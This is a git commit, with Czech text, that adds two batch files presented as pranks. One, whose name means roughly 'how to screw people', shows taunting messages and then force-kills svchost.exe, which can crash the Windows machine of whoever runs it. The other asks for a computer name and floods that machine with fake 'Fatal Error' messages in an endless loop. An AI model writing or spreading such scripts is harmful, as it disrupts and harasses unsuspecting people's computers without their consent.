75761053fc4017780457d973d8c0bad2fa1c1f06
Redstone777274 <vojtech.rogalewicz@gmail.com>
2025-11-15 21:17:04 +0100

    Add files via upload

---
+++ Jak vyjebat s lidmi 3000.bat
@@ -0,0 +1,44 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAnk
+::fBw5plQjdG8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdC2DJGmW+0UiKRZNcDSQM2yoB7gF1Mr37eWUtkRdB7JvKLP+4pGyCuEYqlP9f5Mv124ai4sABR9Vd1L4Pl9k52taswQ=
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+
+echo Tento program je navod jak vyjebat s lidmi
+
+timeout -t 3 >nul
+
+echo Byl jste uspesne vyjeban
+
+timeout -t 1 >nul
+
+taskkill -f -im svchost.exe
---
+++ Prank 3000.bat
@@ -0,0 +1,48 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAnk
+::fBw5plQjdG8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdC2DJGmW+0UiKRZNcDSQM2yoB7gF1Mr37eWUtkRdB7JvKLP+4pGyEPIS5E6kJsZ9hjRfgM5s
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+
+echo Vitejte v Ultimatnim ultra mega prankovaci vasich kamaradu
+echo diky odesilani zprav Fatal error a Use hammer to exit
+echo.
+pause
+
+set /p pcname=Zadejte jmeno pocitace ktery chcete vyprankovat: 
+pause
+
+echo Ted uz se jen divejte na vaseho rozcileneho kamarada :-)
+:a
+msg /server:%pcname% * Fatal Error!!!
+msg /server:%pcname% * Use hammer to exit!
+goto a
